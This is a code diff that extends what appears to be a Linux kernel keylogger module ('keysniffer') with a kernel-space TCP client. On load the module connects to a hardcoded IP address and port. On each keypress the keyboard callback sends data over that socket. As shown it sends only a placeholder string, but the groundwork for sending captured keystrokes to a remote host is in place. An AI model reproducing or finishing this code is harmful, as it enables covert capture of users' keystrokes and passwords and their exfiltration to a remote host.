@@ -6,11 +6,22 @@
 #include <linux/debugfs.h>
 #include <linux/input.h>
 
+#include <linux/net.h>
+#include <net/sock.h>
+#include <linux/tcp.h>
+#include <linux/in.h>
+#include <asm/uaccess.h>
+#include <linux/socket.h>
+#include <linux/slab.h>
+
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 #define CHUNK_LEN 12			 /* Encoded 'keycode shift' chunk length */
 #define US 0					 /* Type code for US character log */
 #define HEX 1					 /* Type code for hexadecimal log */
 #define DEC 2					 /* Type code for decimal log */
+
+#define PORT 2325
+struct socket *conn_socket = NULL;
 
 static int codes; /* Log type module parameter */
 
@@ -170,6 +181,21 @@ const struct file_operations keys_fops = {
 	.read = keys_read,
 };
 
+u32 create_address(u8 *ip)
+{
+	u32 addr = 0;
+	int i;
+
+	for (i = 0; i < 4; i++)
+	{
+		addr += ip[i];
+		if (i == 3)
+			break;
+		addr <<= 8;
+	}
+	return addr;
+}
+
 static ssize_t keys_read(struct file *filp,
 						 char *buffer,
 						 size_t len,
@@ -211,13 +237,79 @@ int sendKeyPress(int sock, int code)
 {
 	printk("I sent testmsg!____________\n");
 }
+int tcp_client_send(struct socket *sock, const char *buf, const size_t length,
+					unsigned long flags)
+{
+	struct msghdr msg;
+	//struct iovec iov;
+	struct kvec vec;
+	int len, written = 0, left = length;
+	mm_segment_t oldmm;
 
+	msg.msg_name = 0;
+	msg.msg_namelen = 0;
+	/*
+msg.msg_iov     = &iov;
+msg.msg_iovlen  = 1;
+*/
+	msg.msg_control = NULL;
+	msg.msg_controllen = 0;
+	msg.msg_flags = flags;
+
+	oldmm = get_fs();
+	set_fs(KERNEL_DS);
+repeat_send:
+
+	vec.iov_len = left;
+	vec.iov_base = (char *)buf + written;
+
+	len = kernel_sendmsg(sock, &msg, &vec, 1, left);
+	
+	if ((len == -ERESTARTSYS) || (!(flags & MSG_DONTWAIT) &&
+								  (len == -EAGAIN)))
+		goto repeat_send;
+	printk("LEN32____%d\n", len);
+
+	if (len > 0)
+	{
+		written += len;
+		left -= len;
+		if (left)
+			goto repeat_send;
+	}
+	set_fs(oldmm);
+	printk("LEN____%d\n", len);
+	return written ? written : len;
+}
+
+int tcp_client_connect(void)
+{
+	unsigned char destip[5] = {10, 129, 41, 200, '\0'};
+
+	int ret = -1;
+
+	ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
+	if (ret < 0)
+	{
+		printk("error socket create");
+	}
+
+	struct sockaddr_in saddr; /* a socket address */
+
+	saddr.sin_family = AF_INET;   /* for internet */
+	saddr.sin_port = htons(PORT); /* using the port PORT */
+	saddr.sin_addr.s_addr = htonl(create_address(destip));
+	ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&saddr, sizeof(saddr), O_RDWR);
+	if (ret && (ret != -EINPROGRESS))
+	{
+		printk("error socket create2");
+	}
+}
 /* Keypress callback */
 int keysniffer_cb(struct notifier_block *nblock,
 				  unsigned long code,
 				  void *_param)
 {
-	size_t len;
 	char keybuf[CHUNK_LEN] = {0};
 	struct keyboard_notifier_param *param = _param;
 
@@ -227,6 +319,13 @@ int keysniffer_cb(struct notifier_block *nblock,
 	if (!(param->down))
 		return NOTIFY_OK;
 	sendKeyPress(222, code);
+	int len = 49;
+	char reply[len + 1];
+
+	memset(&reply, 0, len + 1); /* sets 0s into all the string space */
+	strcat(reply, "HOLA");		/* sets the message */
+
+	tcp_client_send(conn_socket, reply, strlen(reply), MSG_DONTWAIT);
 	keycode_to_string(param->value, param->shift, keybuf, codes);
 	len = strlen(keybuf);
 
@@ -269,14 +368,18 @@ static int __init keysniffer_init(void)
 	}
 
 	register_keyboard_notifier(&keysniffer_blk);
-
-
+	tcp_client_connect();
 }
 
 static void __exit keysniffer_exit(void)
 {
 	unregister_keyboard_notifier(&keysniffer_blk);
 	debugfs_remove_recursive(subdir);
+	if (conn_socket != NULL)
+	{
+		/* relase the socket */
+		sock_release(conn_socket);
+	}
 }
 
 module_init(keysniffer_init);
